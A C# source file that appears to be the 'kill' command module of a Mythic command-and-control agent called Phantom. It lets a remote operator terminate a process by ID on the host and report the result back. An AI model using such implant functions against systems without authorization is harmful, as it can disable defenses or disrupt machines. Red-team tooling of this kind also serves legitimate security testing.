#define COMMAND_NAME_UPPER

#if DEBUG
#define KILL
#endif

#if KILL

using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System;
using System.Runtime.Serialization;

namespace Tasks
{
    public class kill : Tasking
    {
        [DataContract]
        internal struct KillArguments
        {
            [DataMember(Name = "pid")]
            public int PID;
        }
        public kill(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            KillArguments parameters = _dataSerializer.Deserialize<KillArguments>(_data.Parameters);
            try
            {
                System.Diagnostics.Process proc = System.Diagnostics.Process.GetProcessById(parameters.PID);
                proc.Kill();
                resp = CreateTaskResponse($"Killed {proc.ProcessName} ({proc.Id})", true, "completed",
                    new ICommandMessage[]
                    {
                        Artifact.ProcessKill(proc.Id)
                    });
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Failed to kill process. Reason: {ex.Message}", true, "error");
            }

            
            
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif